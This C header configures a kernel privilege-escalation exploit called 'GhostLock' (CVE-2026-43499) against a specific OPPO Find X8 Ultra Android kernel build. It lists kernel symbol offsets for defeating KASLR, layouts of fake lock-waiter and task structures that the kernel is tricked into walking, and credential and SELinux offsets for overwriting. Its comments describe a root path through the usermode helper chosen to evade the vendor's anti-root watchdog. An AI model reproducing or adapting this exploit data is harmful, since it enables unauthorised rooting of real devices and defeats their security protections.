#ifndef TARGET_H
#define TARGET_H

/*
 * OPPO Find X8 Ultra (PKJ110) - CVE-2026-43499 GhostLock target
 *
 * Kernel: Linux 6.6.89-android15-8-gf4dc45704e54-abogki446052083-4k
 * Compiler: Android Clang 18.0.0 (+pgo, +bolt, +lto, +mlgo)
 * Architecture: ARM64, VA_BITS=39, 4K pages
 *
 * Ghidra analysis: vmlinux.elf, image base 0xffffffc080000000
 *
 * Key mitigations:
 *   CONFIG_RANDOMIZE_BASE=y (KASLR)
 *   CONFIG_RANDOMIZE_KSTACK_OFFSET=y
 *   CONFIG_UNMAP_KERNEL_AT_EL0=y (KPTI)
 *   CONFIG_ARM64_PAN=y + CONFIG_ARM64_SW_TTBR0_PAN=y
 *   CONFIG_ARM64_EPAN=y
 *   CONFIG_CFI_CLANG=y (kCFI)
 *   CONFIG_ARM64_PTR_AUTH=y + CONFIG_ARM64_PTR_AUTH_KERNEL=y (PAC)
 *   CONFIG_ARM64_BTI=y (CONFIG_ARM64_BTI_KERNEL not set)
 *   CONFIG_SHADOW_CALL_STACK=y
 *   CONFIG_KASAN_HW_TAGS=y
 *   CONFIG_STATIC_USERMODEHELPER=y (path="")
 *   CONFIG_PANIC_ON_OOPS=y
 */

#define BUILD_VARIANT_LABEL "oppo_pkj110_16_4k"

/* Memory layout - ARM64 VA_BITS=39, Qualcomm */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/*
 * Kernel image physical load address for physmap aliasing.
 * FACT from a.so (KsuRoot LPE) p0_data_alias / data_addr:
 *   mov x8, #0xa8000000; movk x8, #0x3f, lsl#32; add x8,x0,x8; orr PAGE_OFFSET
 * i.e. alias = (image + 0x3fa8000000) | 0xffffff8000000000
 * equivalent to PHYS_LOAD = 0xa8000000, PHYS_OFFSET = 0x80000000,
 * delta = 0x28000000 (also used as bare add in prepare_slide_pselect_fdsets).
 * Prior 0x80010000 matched our log line but NOT a.so; wrong p0 → CONSUMER panic.
 */
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Ashmem/misc fops offsets from image base (llvm-nm + struct miscdevice) */
/* ashmem_misc @ +0x0226c0d8; fops field at +0x10 (minor+pad+name) */
#define ASHMEM_MISC_FOPS_OFF 0x0226c0e8ULL
#define ASHMEM_FOPS_OFF 0x012dc1d8ULL
#define ASHMEM_IOCTL_OFF 0x00c8c9ecULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c8d0a8ULL
#define ASHMEM_MMAP_OFF 0x00c8d0fcULL
#define ASHMEM_OPEN_OFF 0x00c8d31cULL
#define ASHMEM_RELEASE_OFF 0x00c8d3a4ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c8d430ULL

/* Kernel function offsets (Ghidra confirmed) */
#define CONFIGFS_READ_ITER_OFF 0x00499b84ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0049a0b0ULL
#define COPY_SPLICE_READ_OFF 0x0041e3a4ULL
#define NOOP_LLSEEK_OFF 0x003d1144ULL

/* Kernel data symbol offsets (llvm-nm + Ghidra on vmlinux.elf) */
#define INIT_TASK_OFF 0x0210e780ULL
/*
 * llvm-nm vmlinux: root_task_group @ 0xffffffc082306580 → OFF 0x2306580.
 * Prior 0x2108580 was wrong by 0x1fe000 (fake_task.sched_task_group garbage
 * during FOPS PI walk → panic).
 */
#define ROOT_TASK_GROUP_OFF 0x02306580ULL
#define SELINUX_BLOB_SIZES_OFF 0x01665080ULL
/*
 * Runtime enforcing is selinux_state (first byte), NOT selinux_enforcing_boot.
 * Ghidra selinux_init: selinux_state = (selinux_enforcing_boot != 0);
 * sel_read_enforce reads selinux_state. nm: selinux_state @ +0x23490e0.
 */
#define SELINUX_ENFORCING_OFF 0x023490e0ULL
#define SECURITY_HOOK_HEADS_OFF 0x01664948ULL
#define KMALLOC_CACHES_OFF 0x01664488ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0115bdc8ULL

/* SLIDE_* offsets for KASLR leak (llvm-nm + Ghidra) */
#define SLIDE_NFULNL_LOGGER_OFF 0x02102748ULL
/*
 * loggers[NFPROTO_NUMPROTO][NF_LOG_TYPE_MAX]: type ULOG=1 => loggers[0][1]
 * is 8 bytes past the array base. nm 'loggers'=@+0x2102690 is the BASE.
 * a.so boot_16.0.5 profile field matches +0x2102698; nfulnl-loggers[0][1]
 * gap 0xb0 matches Pixel CyberMeowfia targets (0x2102258-0x21021a8).
 */
#define SLIDE_LOGGERS_0_1_OFF 0x02102698ULL
/* sysctl_bootid: /proc/sys/kernel/random/boot_id data (nm: +0x236a0d8) */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0236a0d8ULL
/*
 * a.so profile field bootid_data (boot_16.0.3 / 16.0.5 table +0xc8 / +0x148):
 * 0x22294e8 — used as left/target in a.so slide; sysctl_bootid still 0x236a0d8.
 * Route A: GHOSTLOCK_SLIDE_BOOTID=data|sysctl (default sysctl for /proc match).
 */
#define SLIDE_BOOTID_DATA_OFF 0x022294e8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0236a0d8ULL
/* readelf vmlinux.elf (PKJ110 6.6): random_table @ +0x22293e0,
 * "boot_id" string @ +0x15bc6c1, sysctl_bootid @ +0x236a0d8.
 * File-level parse: entry stride 24B [tagged_procname, .data, 0]; the
 * boot_id entry's .data FIELD (holding &sysctl_bootid statically) sits
 * at +0x22678a8 — the ONLY image qword referencing sysctl_bootid. */

/*
 * UMH root offsets (JoinChang ghostlock-oneplus op13 — SAME kernel build
 * string 6.6.89-android15-8-gf4dc45704e54-abogki446052083-4k, verified
 * against our live kallsyms dump: system_unbound_wq @ base+0x020FB320,
 * call_usermodehelper_exec_work @ base+0x000CFA54).
 * UMH avoids credential patching entirely — the kernel forks our binary
 * with root creds, so no setuid/setenforce syscall ever fires the
 * ColorOS anti-root hook (no tamper tag → no watchdog reboot, no app
 * kills).
 */
#define SYSTEM_UNBOUND_WQ_OFF 0x020FB320ULL
#define CALL_UMH_EXEC_WORK_OFF 0x000CFA54ULL

/* Computed absolute addresses */
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_BOOTID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_BOOTID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Fake waiter/lock page offsets (same as reference - 4K page) */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* Fake waiter structure offsets (verified against OPPO kernel rtmutex_common.h) */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/*
 * Fake task_struct offsets — must match REAL task_struct on this kernel
 * (kernel walks our spray as task_struct). Ghidra device-gap PKJ110 6.6.89:
 *   pi_lock@0x90c, pi_waiters@0x938 (rb_root_cached 16B), then top_task, blocked_on.
 * Prior 0x920 layout mismatched Ghidra → PI walk panic (FORCE_KASLR FOPS).
 */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x90c
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

/* configfs offsets */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* task_struct offsets (Ghidra confirmed) */
#define TASK_PID_OFF 0x618
#define TASK_TGID_OFF 0x61c
#define TASK_REAL_PARENT_OFF 0x628
#define TASK_ATOMIC_FLAGS_OFF 0x5d8
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x820
#define TASK_COMM_OFF 0x830
#define TASK_TASKS_OFF 0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8

/* cred structure offsets */
#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128
/*
 * SELinux blob offsets inside cred->security (struct cred_security *):
 * On OPPO PKJ110 kernel 6.6.89, sid is a u32 at security+4 (after osid).
 * Live probe from SELINUX_BLOB_SIZES overrides these defaults; if that probe
 * returns 0, fall back to these known values from Ghidra analysis.
 */
#define SELINUX_CRED_BLOB_OFF 0     /* base of osid/sid blob within security */
#define SELINUX_CRED_OSID_OFF 0     /* osid: u32 at security + 0 */
#define SELINUX_CRED_SID_OFF 4      /* sid:  u32 at security + 4 */
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* struct page offsets */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
/* a.so reads slab_cache at page->+0x08 after compound_head resolution
 * (matches STRUCT_PAGE_COMPOUND_HEAD_OFF; a.so pipe_reclaim_cache_gate
 * disasm: ldr x22=head; kernel_read64(x22+0x8) -> candidate). */
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

/* pipe buffer offsets */
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/*
 * file_operations offsets — OPPO 6.6 ashmem_fops (Ghidra dump at
 * KIMAGE+0x012dc1d8). Pixel-style 0x50/0x70 layout is WRONG here.
 * Verified non-zero slots:
 *   +0x08 llseek, +0x20 read_iter, +0x48 ioctl, +0x50 compat_ioctl,
 *   +0x58 mmap, +0x68 open, +0x78 release, +0xd0 show_fdinfo
 * (no splice_read on this ashmem_fops table)
 */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
/* Live: show@0xd0 reads 0; show@0xd8 holds ashmem_show_fdinfo (leak_kb). */
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
